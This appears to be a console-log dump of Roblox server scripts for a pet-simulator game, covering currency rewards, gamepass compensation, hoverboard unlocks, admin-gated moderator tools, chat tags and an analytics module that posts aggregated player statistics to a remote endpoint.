	_L.Network.Fire("Move Time Change", plr, 0)
end

_L.Network.Fired("Move Server"):Connect(Move)
_L.Signal.Fired("Player Added"):Connect(function(plr)
	if not _G.MoveCache[plr] then
		_G.MoveCache[plr] = 0
	end
	coroutine.wrap(function()
		while _L.Heartbeat() do
			_G.MoveCache[plr] += 1
			_L.Network.Fire("Move Time Change", plr, _G.MoveCache[plr])
		end
	end)()
end)  -  Editar
  04:54:13.779    -  Editar
  04:54:13.779  ----- [2377] ServerScriptService.Scripts.Game.PawTokenGiver -----  -  Editar
  04:54:13.779  --------|     Setting     |--------
--local enabled = _L.Settings.PawTokensEvent
local waitTime = 60

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_L.Signal.Fired("Player Added"):Connect(function(plr: instance)
	local save = _L.Saving.Get(plr)
	assert(save)
	
	coroutine.wrap(function()
		while task.wait(waitTime) do
			assert(plr and plr.Parent)
			local character = plr.Character
			if character then
				_L.Orbs.Add(plr, character.HumanoidRootPart.Position, "Paw Tokens", 1, math.huge)
			end	
		end
	end)()
end)
  -  Editar
  04:54:13.779    -  Editar
  04:54:13.779  ----- [2378] ServerScriptService.Scripts.Game.CalculateGamepassReward -----  -  Editar
  04:54:13.780  --------|     Setting     |--------
local basicRewards = {
	["tier1"] = {
		class = "Currency";
		reward = "Paw Tokens";
		amount = 3;
	};
	["tier2"] = {
		class = "Currency";
		reward = "Paw Tokens";
		amount = 5;
	};
	["tier3"] = {
		class = "Currency";
		reward = "Paw Tokens";
		amount = 10;
	};
}

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


local function softAssert(asserting): boolean return asserting==true end

function calculateTier(id: number): string
	if type(id)~="number" then return nil end
	
	local price = _L.Functions.GetPrice(id)
	if not price then
		return nil
	end
	
	local tier = "tier1"
	if price >= 100 then
		tier = "tier3"
	elseif price >= 50 then
		tier = "tier2"
	end
	return tier
end

function getPlayerGamepasses(plr: instance): table
	local owned = {}
	for key, value in pairs(_L.Directory.Gamepasses) do
		local id = value.ID
		if id then
			if _L.MarketplaceService:UserOwnsGamePassAsync(plr.UserId, id) then
				table.insert(owned, id)
			end
		end
	end
	return owned
end

function giveRewards(plr: instance, rewards: table): boolean
	local save = _L.Saving.Get(plr)
	if not save then
		return nil
	end
	
	local recieving = 0
	for index, value in ipairs(rewards) do
		local class, reward, amount = value.class, value.reward, value.amount
		--amount = amount or 1
		if not class or not reward or not amount then
			return false
		end
		 
		if class == "Currency" then
			_L.Give.Currency(plr, amount, reward)
			recieving+=amount
		end
	end
	
	_L.Network.Fire("Notification", plr, "You recieved "..recieving.." Paw Tokens thanks for your support!", {time = 7.5, color = Color3.fromRGB(255, 255, 255), force = true})
	save.GamepassesCompensated = true
	return true
end

function calculateRewards(plr: instance): boolean
	_G.HasLoaded(plr)
	--_G.ProcessPending(plr,true)
	
	if not (typeof(plr) == "Instance") then
		--_G.ProcessPending(plr,false)
		return nil
	end

	local save = _L.Saving.Get(plr)
	if not save then
		--_G.ProcessPending(plr,false)
		return nil
	end
	
	if save.GamepassesCompensated then
		--_G.ProcessPending(plr,false)
		return false, "You have already claimed this!"
	end
	
	local gamepasses = getPlayerGamepasses(plr)
	if not gamepasses then
		--_G.ProcessPending(plr,false)
		return nil
	end
	
	if #gamepasses < 1 then
		return false, "You don't own any gamepasses redeem. Sorry!"
	end

	local rewards = {}
	for index, value in ipairs(gamepasses) do
		local tier = calculateTier(value)
		local tierData = basicRewards[tier]
		if not tierData then
			--_G.ProcessPending(plr,false)
			return nil
		end

		table.insert(rewards, tierData)
	end
	
	local success = giveRewards(plr, rewards)
	
	--_G.ProcessPending(plr,false)
	return success
end

--- 	
_L.Network.Invoked("Calculate Gamepass Rewards").OnInvoke = calculateRewards
_L.Signal.Invoked("Calculate Gamepass Rewards").OnInvoke = calculateRewards  -  Editar
  04:54:13.780    -  Editar
  04:54:13.780  ----- [2379] ServerScriptService.Scripts.Game.Majin -----  -  Editar
  04:54:13.780  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Library")) _L.Load()

--------|    Reference    |--------

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


_L.Network.Invoked("MajinGame").OnInvoke = function(player: Player?): boolean
	return pcall(function()
		_L.TeleportService:Teleport(tonumber(workspace.__VARIABLES.Majin.Value), player)
	end)
end  -  Editar
  04:54:13.780    -  Editar
  04:54:13.780  ----- [2380] ServerScriptService.Scripts.Game.Unlock Hoverboard -----  -  Editar
  04:54:13.780  -- this script was maded by szythe
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local Players = game:GetService('Players')
local RunService = game:GetService('RunService')
local Signal = ReplicatedStorage:WaitForChild('Library').Signal
local Saving = require(ReplicatedStorage:WaitForChild('Library')).Saving
local Network = require(ReplicatedStorage:WaitForChild('Library')).Network
local Gamepasses = require(ReplicatedStorage:WaitForChild('Library')).Gamepasses
local Directory = require(ReplicatedStorage:WaitForChild('Library')).Directory

local Debug = RunService:IsStudio()
local OwnsHoverboard = false
local OwnsVIP = false

local function AddHoverboard(player, hoverboardName)
	local save = Saving.Get(player)
	if not save then return end

	if not table.find(save.Hoverboards, hoverboardName) then
		if Debug then
			warn('Hoverboard', hoverboardName, 'is being added to player inventory')
		end

		table.insert(save.Hoverboards, hoverboardName)
		Network.Fire('Hoverboard Unlocked', player, hoverboardName)
		save.EquippedHoverboard = hoverboardName
	end
end

local function Update(player)
	local groupRank = player:GetRankInGroup(33201312)
	local save = Saving.Get(player)
	local robuxSpent = save.RobuxSpent or 0

	if not save then return end

	if Debug then
		warn('Checking hoverboards & rewarding them')
	end

	if OwnsHoverboard then
		local hoverboardsToUnlock = {
			'Original', 'VIP', 'Bee', 'Steampunk', 'Sleigh',
			'Rudolph', 'Cat', 'Red Flying Carpet', 'Rainbow', 'Purple', 'Pumpkin Cat',
			'M-10', 'High Tech', 'Flame', 'M-10', 'Easter Bunny', 'Doodle',
			'Diamond Cat', 'Blue Flying Carpet', 'Bling'
		}

		for _, hoverboardName in pairs(hoverboardsToUnlock) do
			AddHoverboard(player, hoverboardName)
		end
	end

	if OwnsVIP and OwnsHoverboard then
		AddHoverboard(player, 'VIP')
	end

	if groupRank == 254 then
		AddHoverboard(player, 'Flame')
	end

	if robuxSpent >= 100 then
		AddHoverboard(player, 'Bling')
	end

	if _G.LBSpot >= 100 or _G.LBSpotRAP >= 100 then
		AddHoverboard(player, 'Red Flying Carpet')
	end

	if _G.LBSpot >= 10 or _G.LBSpotRAP >= 10 then
		AddHoverboard(player, 'Blue Flying Carpet')
	end

	if save.Diamonds >= Directory.Currency['Diamonds'].Limit then
		AddHoverboard(player, 'Diamond')
	end
end

local function PlayerAdded(player)
	_G.LBSpot = 0
	_G.LBSpotRAP = 0

	OwnsHoverboard = Gamepasses.Owns(player, Directory.Gamepasses.Hoverboard.ID)
	OwnsVIP = Gamepasses.Owns(player, Directory.Gamepasses.VIP.ID)

	while true do
		if not player or not player.Parent then
			if Debug then
				warn('No player, ending hoverboard loop')
			end
			break
		end

		Update(player)

		wait(10)
	end
end

local function StatChanged(player, stat)
	if stat == 'Gamepasses' then
		if not OwnsHoverboard then
			OwnsHoverboard = Gamepasses.Owns(player, Directory.Gamepasses.Hoverboard.ID)
		end

		if not OwnsVIP then
			OwnsVIP = Gamepasses.Owns(player, Directory.Gamepasses.VIP.ID)
		end
	end
end

Signal.Fired('Player Added').Connect(PlayerAdded)
Signal.Fired('Stat Changed').Connect(StatChanged)

for _, player in pairs(Players:GetPlayers()) do
	PlayerAdded(player)
end  -  Editar
  04:54:13.780    -  Editar
  04:54:13.780  ----- [2381] ServerScriptService.Scripts.Core.Debug Gui -----  -  Editar
  04:54:13.780  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------
local isStudio = _L.Services.RunService:IsStudio()

--------|    Variables    |--------


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


--- Give moderator GUI to player
function GiveGui(player)
	wait() --- prevents console errors
	if player then
		local debugGui = game.ServerStorage:FindFirstChild("Debug"):Clone()
		debugGui.Parent = player
	end
end


--- Player added function
local function PlayerAdded(player) 
	if isStudio or _L.Admins.IsAdmin(player) then
		GiveGui(player)
	end
end  


--- Players in server
for _, player in ipairs(game.Players:GetPlayers()) do  
	PlayerAdded(player)  
end   

game.Players.PlayerAdded:Connect(PlayerAdded)  -  Editar
  04:54:13.781    -  Editar
  04:54:13.781  ----- [2382] ServerScriptService.Scripts.Core.Moderator Util -----  -  Editar
  04:54:13.781  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------
local isStudio = game:GetService("RunService"):IsStudio()

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


if isStudio then --- disable on studio (why would you need it?)
	--return
end


--- Server invoked
_L.Network.Invoked("ModeratorUtil").OnInvoke = function(player, cmd, ...)
	--- Return if not admin
	if not _L.Admins.IsAdmin(player) then
		return
	end
	
	--- Cmds
	if cmd == "GetList" then
		--- Returns recent activity list
		return _L.Bans.GetRecentList(...)
		
	elseif cmd == "GetProfile" then
		--- Returns player's profile
		return _L.Bans.GetProfile(...)
		
	elseif cmd == "Warn" then
		--- Warns player
		return _L.Bans.Warn(...)
		
	elseif cmd == "Ban" then
		--- Ban player
		return _L.Bans.Ban(...)
		
	elseif cmd == "Clear" then
		--- Unban/unwarn player
		return _L.Bans.Clear(...)
		
	elseif cmd == "GetOSTime" then
		--- Return os.time()
		return os.time()
		
	end
end


------------------------------------------------------------------------------


--- Give moderator GUI to player
function GiveGui(player)
	wait() --- prevents console errors
	if player then
		local modGui = game.ServerStorage:FindFirstChild("Moderator Util"):Clone()
		modGui.Parent = player
	end
end


--- Player added function
local function PlayerAdded(player) 
	if _L.Admins.IsAdmin(player) then
		GiveGui(player)
	end
end  


--- Players in server
for _, player in ipairs(game.Players:GetPlayers()) do  
	PlayerAdded(player)  
end   

game.Players.PlayerAdded:Connect(PlayerAdded)  -  Editar
  04:54:13.781    -  Editar
  04:54:13.781  ----- [2383] ServerScriptService.Scripts.Core.Shutdown -----  -  Editar
  04:54:13.781  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Fired('Send Position'):Connect(function(plyr, PrimaryPartCFrame, CurrentCameraCFrame, CurrentCameraFocus)
	local save = _L.Saving.Get(plyr)

	if save then
		save.PositionData.PlayerCFrame = PrimaryPartCFrame
		save.PositionData.CameraCFrame = CurrentCameraCFrame
		save.PositionData.CameraFocus = CurrentCameraFocus
	end
end)

_L.Signal.Fired("Server Closing"):Connect(function()
    --if not workspace:GetAttribute("ServerClosing") then return end
	
	coroutine.wrap(function()
		_L.Network.FireAll("Client Loading", "Pet Simulator X")
	end)()
	
	for i, plr in ipairs(_L.Players:GetPlayers()) do		
		local autoHatchData, enabled, eggId = _L.Network.Invoke("Check Opening Status", plr)
		if autoHatchData then
			if enabled then
				_L.Variables.AutoHatchEnabled = false
			end
			if eggId then
				_L.Variables.AutoHatchEggId = false
			end
		end
	end
end)  -  Editar
  04:54:13.781    -  Editar
  04:54:13.781  ----- [2384] ServerScriptService.Scripts.Core.Chat Tags -----  -  Editar
  04:54:13.781  --------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------
local ChatService = require(game.ServerScriptService:WaitForChild("ChatServiceRunner"):WaitForChild("ChatService"))

--------|    Variables    |--------

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

if not game.ServerScriptService:WaitForChild("ChatServiceRunner") then
	return
end

--- Return the correct chat tag style for this player depending on their group rankings/misc stuff
function GetStyle(player)
    local function FindCustomTag(userId)
        for _, customData in ipairs(_L.Settings.CustomChatTags) do
            if _L.Functions.SearchArray(customData.userIds, userId) then
                return customData.tag
            end
        end
    end

    -- save
    local save = _L.Saving.Get(player)
    if not save then
        return nil
    end

    --- Find correct tag
    local customTag = FindCustomTag(player.UserId)
    if customTag then
        return customTag

    elseif _L.Admins.IsAdmin(player) then
        local rank = player:GetRankInGroup(32604465)

        --- Owner
        if rank == 255 or rank == 254 then
            return {
                tag = "⚡God", 
                tagColor = Color3.fromRGB(236, 255, 0), 
                chatColor = Color3.fromRGB(250, 255, 180), 
                nameColor = Color3.fromRGB(255, 38, 230)
            }

            --- Developer
        elseif rank == 100 then
            return {
                tag = "🔨Devloper", 
                tagColor = Color3.fromRGB(255, 56, 114),
                chatColor = Color3.fromRGB(243, 188, 210), 
                nameColor = Color3.fromRGB(29, 107, 231),
            }

            --- Community Manager
        elseif rank == 10 then
            return {
                tag = "🌴Community Manager",
                tagColor = Color3.fromRGB(56, 255, 189), 
                chatColor = Color3.fromRGB(204, 255, 221),
                nameColor = Color3.fromRGB(56, 255, 189),
            }

            --- Admin
        elseif rank == 3 then
            return {
                tag = "🛠️Administrator", 
                tagColor = Color3.fromRGB(157, 23, 240), 
                chatColor = Color3.fromRGB(222, 193, 240),
            }

            --- Moderator
        else
            return {
                tag = "🔧Moderator", 
                tagColor = Color3.fromRGB(220, 162, 247), 
                chatColor = Color3.fromRGB(239, 223, 247),
            }
        end

    else
        local rank = player:GetRankInGroup(32485727)
        local rankWorldwide = _L.Signal.Invoke("Get Leaderboard Position", player) or 0
        local pwrRankWorldwide = _L.Signal.Invoke("Get Power Leaderboard Position", player) or 0
        if rankWorldwide < pwrRankWorldwide then
            rankWorldwide = pwrRankWorldwide
        end



        --- Partner
        if rank == 5 then
            return {
                tag = "🔥Partner", 
                tagColor = Color3.fromRGB(255, 136, 0),
                nameColor = Color3.fromRGB(255, 191, 0),
			}
			
		elseif rank == 10 then
			return {
				tag = "💗Booster", 
				tagColor = Color3.fromRGB(255, 207, 249),
				nameColor = Color3.fromRGB(255, 244, 254),
			}

            --- Top 100 Rank
        elseif rankWorldwide and rankWorldwide <= 100 and rankWorldwide >= 1 then
            return {
                tag = "🌎" .. string.format("#%d", rankWorldwide),
                tagColor = Color3.fromRGB(135, 255, 239)
            }
            --- Affiliate
        elseif rank == 15 then
            return {
                tag = "🛠Affiliate", 
                tagColor = Color3.fromRGB(135, 255, 239),
            }

            --- VIP
        elseif _L.Gamepasses.Owns(player, _L.Directory.Gamepasses["VIP"].ID) then
            return {
                tag = "👑VIP", 
                tagColor = Color3.fromRGB(221, 229, 66), 
                chatColor = Color3.fromRGB(223, 229, 156),
                nameColor = Color3.fromRGB(246, 255, 64),
            }

            --- Verified
        elseif save.IsFollowingOnTwitter then
            return {
                tag = "✅Verified", 
                tagColor = Color3.fromRGB(113, 220, 99)
            }

            --- Fan
        elseif player:IsInGroup(32485727) then
            return {
                tag = "Fan", 
                tagColor = Color3.fromRGB(229, 151, 86)
            }
        end
    end
end


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


--- Player has joined
ChatService.SpeakerAdded:Connect(function(SpeakerName)
    local t = tick()
    repeat
        --- Get speaker & player
        local success = false
        local player = game.Players:FindFirstChild(SpeakerName)
        local speaker = ChatService:GetSpeaker(SpeakerName)

        --- Update chat & tag style settings
        if speaker and player then
            local styleData = GetStyle(player)
            --
            if styleData then
                --- Custom
                local tag, tagColor, chatColor, nameColor = styleData.tag, styleData.tagColor, styleData.chatColor, styleData.nameColor
                speaker:SetExtraData("Tags", {{TagText = tag, TagColor = tagColor}})
                speaker:SetExtraData("ChatColor", chatColor)
				speaker:SetExtraData("NameColor", nameColor or Color3.fromRGB(175, 175, 175))
			
            else
                --- Default
                speaker:SetExtraData("NameColor", Color3.fromRGB(175, 175, 175))
            end
            --
            success = true
        end

        wait(1)
    until (not success)
end)
  -  Editar
  04:54:13.782    -  Editar
  04:54:13.782  ----- [2385] ServerScriptService.Scripts.Core.BIG Analytics [Secure] -----  -  Editar
  04:54:13.782  --------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|     Modules     |--------
local Analytics = {}
local Encrypt = require(script:WaitForChild("Encryption"))
local Authentication = require(script:WaitForChild("Authentication"))

--------|     Settings     |--------
-- the identifier of the database collection.  must be unique for each game, and must
-- be manually created on MongoDB Atlas once for each game
local MONGODB_COLLECTION_NAME = "psx"
local WRITE_ACTIONS_INTERVAL = 5*60 -- MUST be in-sync with Heroku

--------|     Source     |--------
local incrementCache = {}
local joinedPlayersSincePush = 0
local joinedPlayersSincePushLanguage = {}
local joinedPlayersSincePushDevice = {}
local newPlayersSincePush = 0
local newPlayersSincePushLanguage = {}
local newPlayersSincePushDevice = {}
local playerJoinedTimes = {}
local playerJoinedTimesLeft = {}
local lastWriteTime = tick()
local playerDevices = {}
local playerFramerates = {}
local playerLanguages = {}
local isStudio = _L.Services.RunService:IsStudio()


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


local function languageKeyFromPlayer(player)
	return playerLanguages[player.Name] or nil
end

local function deviceKeyFromPlayer(player)
	return playerDevices[player.Name] or nil
end

function Analytics.BuildQueryString(queryParams)
	local queryString = "?"
	for k, v in pairs(queryParams) do
		queryString = queryString .. (
			_L.Services.HttpService:UrlEncode(k) ..
			"=" ..
			_L.Services.HttpService:UrlEncode(v) ..
			"&"
		)
	end
	return queryString:sub(1, queryString:len() - 1)
end

function Analytics.SendWriteRequest(queryParams, body, callback)
	
	body = _L.Services.HttpService:JSONEncode(body)
	
	local BASE_URL = "http://big-analytics.herokuapp.com/write/"
	
	queryParams["TS"] = math.floor(tick())
	queryParams["baseURL"] = BASE_URL
	queryParams["PBLC"] = Authentication.WRITE_KEY_PUBLIC
	
	--- Wrapped in a pcall just in case
	local response
	local success = pcall(function()
		local authString = Authentication.EncodeAuthenticationString(queryParams)
		response = _L.Services.HttpService:RequestAsync({
			Url = BASE_URL .. Analytics.BuildQueryString(queryParams),
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
				["Authorization"] = authString
			},
			Body = body  
		})
	end)
	
	if callback then
		callback(response)
	end
end

function Analytics.Increment(key, value)
	if type(key) ~= "string" then
		_L.Print("Increment key must be of type 'string', got type '" .. type(key) .. "'", true)
		return
	end
	if type(value) ~= "number" then
		_L.Print("Increment value must be of type 'number', got type '" .. type(value) .. "'", true)
		return
	end
	
	table.insert(incrementCache, {
		[key] = value
	})
end

function Analytics.IncrementWithLanguage(key, value, player)
	if not languageKeyFromPlayer(player) then
		return
	end
	local languageKey = key .. "_" .. languageKeyFromPlayer(player)
	Analytics.Increment(languageKey, value)
end

function Analytics.IncrementWithDevice(key, value, player)
	if not playerDevices[player.Name] then
		return
	end
	local deviceKey = key .. "_" .. playerDevices[player.Name]
	Analytics.Increment(deviceKey, value)
end

local deepcopy
function deepcopy(t)
	local copy = {}
	for k, v in pairs(t) do
		copy[k] = (type(v) == "table") and deepcopy(v) or v
	end
	return copy
end

-- merges the entire array of incrementKeys, so we don't
-- send all of the data to Heroku and flood it
local function mergeIncrementKeys(t)
	local merged = {}
	for _, keyset in ipairs(t) do
		for key, value in pairs(keyset) do
			if not merged[key] then
				merged[key] = 0
			end
			merged[key] = merged[key] + value
		end
	end
	return merged
end

local function performIncrementPush()
	
	local mergedKeys = mergeIncrementKeys(incrementCache)
	incrementCache = {}
	
	local joinedPlayerSessions = joinedPlayersSincePush
	joinedPlayersSincePush = 0
	
	local newPlayerSessions = newPlayersSincePush
	newPlayersSincePush = 0
	
	local query = {
		writeType = "INCREMENT";
		SID = game.JobId;
		COL = MONGODB_COLLECTION_NAME;
	}
	
	local body = {
		incrementKeys = mergedKeys;
	}
		
	-- count concurrent players
	local plrs = game.Players:GetPlayers()
	mergedKeys.PC = #plrs
	for i, v in ipairs(plrs) do
		if v then
			local languageID = languageKeyFromPlayer(v)
			local deviceID   = deviceKeyFromPlayer(v)
			
			-- count concurrent players by language
			if languageID then
				local languageKeyPC = string.format("PC_%s", languageID)
				if not mergedKeys[languageKeyPC] then
					mergedKeys[languageKeyPC] = 0
				end
				mergedKeys[languageKeyPC] = mergedKeys[languageKeyPC] + 1
			end
			
			-- count concurrent players by device			
			if deviceID then
				local deviceKeyPC = string.format("PC_%s", deviceID)	
				if not mergedKeys[deviceKeyPC] then
					mergedKeys[deviceKeyPC] = 0
				end
				mergedKeys[deviceKeyPC] = mergedKeys[deviceKeyPC] + 1
			end
		end
	end
	
	-- count sessions, also by language & device
	mergedKeys.SES = joinedPlayerSessions
	for key, value in pairs(joinedPlayersSincePushLanguage) do
		mergedKeys["SES_" .. key] = value
	end
	for key, value in pairs(joinedPlayersSincePushDevice) do
		mergedKeys["SES_" .. key] = value
	end
	joinedPlayersSincePushLanguage = {}
	joinedPlayersSincePushDevice = {}
	
	-- count new players, also by language & device
	mergedKeys.NEW = newPlayerSessions
	for key, value in pairs(newPlayersSincePushLanguage) do
		mergedKeys["NEW_" .. key] = value
	end
	for key, value in pairs(newPlayersSincePushDevice) do
		mergedKeys["NEW_" .. key] = value
	end
	newPlayersSincePushLanguage = {}
	newPlayersSincePushDevice = {}
	
	-- count total time played (in minutes), also by language & device
	mergedKeys.SUMTIME = 0
	for playerName, timeJoined in pairs(playerJoinedTimes) do
		local player = game.Players:FindFirstChild(playerName)
		if player then
			local timeEntry = math.min((tick() - timeJoined)/60, WRITE_ACTIONS_INTERVAL/60)
			mergedKeys.SUMTIME = mergedKeys.SUMTIME + timeEntry
			if playerLanguages[playerName] then
				local languageKey = string.format("SUMTIME_%s", languageKeyFromPlayer(player))
				if not mergedKeys[languageKey] then
					mergedKeys[languageKey] = 0
				end
				mergedKeys[languageKey] = mergedKeys[languageKey] + timeEntry
			end
			if playerDevices[playerName] then
				local deviceKey = string.format("SUMTIME_%s", deviceKeyFromPlayer(player))
				if not mergedKeys[deviceKey] then
					mergedKeys[deviceKey] = 0
				end
				mergedKeys[deviceKey] = mergedKeys[deviceKey] + timeEntry
			end
		end
	end
	
	-- calculate performance for each user, then take an average that represets
	-- the server average framerate
	local framerateKeyCount = {}
	mergedKeys.PER = 0
	for playerName, framerate in pairs(playerFramerates) do
		mergedKeys.PER = mergedKeys.PER + framerate
		local player = game.Players:FindFirstChild(playerName)
		if player then
			local languageID = languageKeyFromPlayer(player)
			if languageID then
				local languageKey = string.format("PER_%s", languageKeyFromPlayer(player))
				if not mergedKeys[languageKey] then
					mergedKeys[languageKey] = 0
				end
				if not framerateKeyCount[languageKey] then
					framerateKeyCount[languageKey] = 0
				end
				mergedKeys[languageKey] = mergedKeys[languageKey] + framerate
				framerateKeyCount[languageKey] = framerateKeyCount[languageKey] + 1
			end
			local deviceID = deviceKeyFromPlayer(player)
			if deviceID then
				local deviceKey = string.format("PER_%s", deviceID)
				if not mergedKeys[deviceKey] then
					mergedKeys[deviceKey] = 0
				end
				if not framerateKeyCount[deviceKey] then
					framerateKeyCount[deviceKey] = 0
				end
				mergedKeys[deviceKey] = mergedKeys[deviceKey] + framerate
				framerateKeyCount[deviceKey] = framerateKeyCount[deviceKey] + 1
			end
		end
	end
	-- take averages for each performance key
	local divisor = #game.Players:GetPlayers() > 0 and #game.Players:GetPlayers() or 1
	mergedKeys.PER = mergedKeys.PER / divisor
	for key, value in pairs(mergedKeys) do
		if key:find("PER") and key ~= "PER" then
			mergedKeys[key] = mergedKeys[key] / framerateKeyCount[key]
		end
	end
	
	-- players that left the game have an extra entry with
	-- their final contributing time (note: they've been removed
	-- from playerJoinedTimes, and thus have not yet been
	-- accounted for)
	for _, entry in ipairs(playerJoinedTimesLeft) do
		local timeEntry = math.floor(entry.finalTimeEntry)
		mergedKeys.SUMTIME = mergedKeys.SUMTIME + timeEntry
		if entry.languageID then
			local languageKey = string.format("SUMTIME_%s", entry.languageID)
			if not mergedKeys[languageKey] then
				mergedKeys[languageKey] = 0
			end
			mergedKeys[languageKey] = mergedKeys[languageKey] + timeEntry
		end
		if entry.deviceID then
			local deviceKey = string.format("SUMTIME_%s", entry.deviceID)
			if not mergedKeys[deviceKey] then
				mergedKeys[deviceKey] = 0
			end
			mergedKeys[deviceKey] = mergedKeys[deviceKey] + timeEntry
		end
	end
	playerJoinedTimesLeft = {}
	lastWriteTime = tick()

	Analytics.SendWriteRequest(query, body, function(response)
		_L.Print("Sent analytics to server. Got response code: " .. response.StatusCode)
	end)
end

local function startAnalyticsBackground()
	
	if isStudio then
		return
	end
	
	-- main Heroku-writing thread
	coroutine.wrap(function()
		-- CRUCIAL - when we restart servers, we don't want them to be all on
		-- a similar clock cycle.  so wait this random interval to create offsets.
		-- we want the push times as uniformly-distributed as possible
		wait(math.random(WRITE_ACTIONS_INTERVAL))
		while true do
			wait(WRITE_ACTIONS_INTERVAL)
			pcall(function() performIncrementPush() end)
		end
	end)()
	
	-- update player languages every 30 seconds
	coroutine.wrap(function() 
		while wait(30) do
			for _, player in ipairs(game.Players:GetPlayers()) do
				pcall(function()
					coroutine.wrap(function()
						playerLanguages[player.Name] = _L.Network.Invoke("GetPlayerLanguage", player)
					end)()
				end)
			end
		end
	end)()
	
	-- update player devices every two minutes
	coroutine.wrap(function()
		while wait(120) do
			for _, player in ipairs(game.Players:GetPlayers()) do
				coroutine.wrap(function()
					pcall(function()
						playerDevices[player.Name] = _L.Network.Invoke("GetPlayerPlatform", player)
					end)
				end)()
			end
		end
	end)()
	
	-- update player framerates every 10 seconds (MUST be less than
	-- WRITE_ACTIONS_INTERVAL, or else we will get initial values
	-- of zero, which is bad!!!!)  basically, keep this value small
	-- so that we always have a relatively up-to-date framerate when
	-- we push to Heroku
	coroutine.wrap(function()
		while wait(10) do
			for _, player in ipairs(game.Players:GetPlayers()) do
				coroutine.wrap(function()
					pcall(function()
						playerFramerates[player.Name] = _L.Network.Invoke("GetPlayerFramerate", player)
					end)
				end)()
			end
		end
	end)()
	
	local function tallyNewSession(player)
		-- entry in table for accumulated time spent playing
		playerJoinedTimes[player.Name] = math.floor(tick())
		
		-- when the player joins, get their platform.  it   
		-- is later updated every two minutes (controller 
		-- plugged in / disconnected, etc)
		-- wait for client _L to load
		local deviceGetStart = tick()
		wait(2)
		repeat
			wait(5)
			pcall(function()
				playerDevices[player.Name] = _L.Network.Invoke("GetPlayerPlatform", player)
			end)
		until playerDevices[player.Name] or (tick() - deviceGetStart) > 60
		
		pcall(function()
			playerLanguages[player.Name] = _L.Network.Invoke("GetPlayerLanguage", player)
		end)
		
		if not player or not playerDevices[player.Name] or not playerLanguages[player.Name] then
			_L.Print("failed to get device and/or language for player " .. player.Name)
			_L.Print("device: " .. (playerDevices[player.Name] or "nil"))
			_L.Print("language: " .. (playerLanguages[player.Name] or "nil"))
			return
		end
		
		-- tally individual session, with both language and device
		joinedPlayersSincePush = joinedPlayersSincePush + 1
		local languageKey = languageKeyFromPlayer(player)
		if not joinedPlayersSincePushLanguage[languageKey] then
			joinedPlayersSincePushLanguage[languageKey] = 0
		end
		joinedPlayersSincePushLanguage[languageKey] = joinedPlayersSincePushLanguage[languageKey] + 1
		local deviceKey = deviceKeyFromPlayer(player)
		if not joinedPlayersSincePushDevice[deviceKey] then
			joinedPlayersSincePushDevice[deviceKey] = 0
		end
		joinedPlayersSincePushDevice[deviceKey] = joinedPlayersSincePushDevice[deviceKey] + 1
		
		-- tally new player (if necessary) with both language and device
		local save = _L.Saving.Get(player)
		if save and (not save.HasPlayedBefore) then
			newPlayersSincePush = newPlayersSincePush + 1
			if not newPlayersSincePushLanguage[languageKey] then
				newPlayersSincePushLanguage[languageKey] = 0
			end
			newPlayersSincePushLanguage[languageKey] = newPlayersSincePushLanguage[languageKey] + 1
			local deviceKey = deviceKeyFromPlayer(player)
			if not newPlayersSincePushDevice[deviceKey] then
				newPlayersSincePushDevice[deviceKey] = 0
			end
			newPlayersSincePushDevice[deviceKey] = newPlayersSincePushDevice[deviceKey] + 1
			save.HasPlayedBefore = true
		end
	end
